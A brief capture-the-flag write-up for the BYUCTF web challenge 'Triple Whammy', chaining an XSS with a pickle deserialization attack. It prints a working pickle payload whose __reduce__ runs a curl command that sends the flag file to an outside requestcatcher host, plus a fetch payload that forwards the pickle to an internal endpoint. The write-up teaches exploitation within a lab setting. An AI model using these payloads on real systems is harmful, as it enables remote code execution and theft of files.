<font size = '4'>
<p align = 'center'>
<b>
BYUCTF - Triple Whammy Writeup 
</b>
</p>
</font>

<br>
<font size = '3'>

<b>Challenge Description:</b><br>

Server - https://triple-whammy.chal.cyberjousting.com/

Admin bot - https://triple-whammy-admin.chal.cyberjousting.com/

[triple-whammy.zip]

<br>

<b>Exploitation:</b><br>

Web app is vulnerable to XSS, and a pickle deserialization attack, which can lead to code execution.

```python
import pickle

class Exploit(object):
    def __reduce__(self):
        import os
        return (os.system, ('curl https://lego.requestcatcher.com/flag?$(cat /ctf/flag.txt)',))
    
exploit = pickle.dumps(Exploit()).hex()
```

Basically serializes the cmd and converts it to hex.

```python
fetch('/query', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    'url': f'http://127.0.0.1:5902/pickle?pickle={exploit}'
  })
})
```

So, `<script>` tags are inserted into name for XSS. The JS makes a POST request to the /query endpoint. Data is deserealized, cmd is executed, flag is catted.